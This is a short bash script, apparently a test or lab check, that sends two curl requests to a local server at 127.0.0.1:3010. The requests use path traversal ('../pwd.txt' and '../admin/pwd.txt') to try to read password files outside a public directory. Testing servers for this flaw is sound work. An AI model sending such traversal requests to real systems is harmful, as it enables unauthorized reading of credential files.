#!/bin/bash
echo -n "path traversal 1 (one directory up): "
curl '127.0.0.1:3010/info/public/../pwd.txt'
echo 
echo -n "path traversal 2 (into admin dir): "
curl '127.0.0.1:3010/info/public/../admin/pwd.txt'
echo 
